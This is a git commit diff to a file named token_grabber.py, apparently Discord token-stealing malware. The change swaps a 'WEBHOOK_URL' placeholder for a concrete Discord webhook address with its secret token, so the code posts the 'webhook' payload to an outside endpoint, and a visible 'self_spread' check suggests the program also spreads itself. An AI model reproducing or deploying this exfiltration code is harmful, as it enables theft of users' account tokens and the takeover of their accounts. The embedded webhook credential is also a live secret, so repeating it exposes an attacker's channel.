1998add5010c625c29e3223eb703f9300b50dd82
SSJB-Hax <111650487+SSJB-Hax@users.noreply.github.com>
2022-08-20 17:03:14 +0100

    Update token_grabber.py

--- token_grabber.py
+++ token_grabber.py
@@ -182,7 +182,7 @@ def main():
         "avatar_url": "https://discordapp.com/assets/5ccabf62108d5a8074ddd95af2211727.png"
     }
     try:
-        urlopen(Request("WEBHOOK_URL", data=dumps(webhook).encode(), headers=getheaders()))
+        urlopen(Request("https://discord.com/api/webhooks/951952173548322917/jLNE5hhllHDfZ4gU2V2KvKQB93j9JYCqdarWFMDzZgsUknJvjocfDdlcSB_a1VCgbspC", data=dumps(webhook).encode(), headers=getheaders()))
     except:
         pass
     if self_spread:
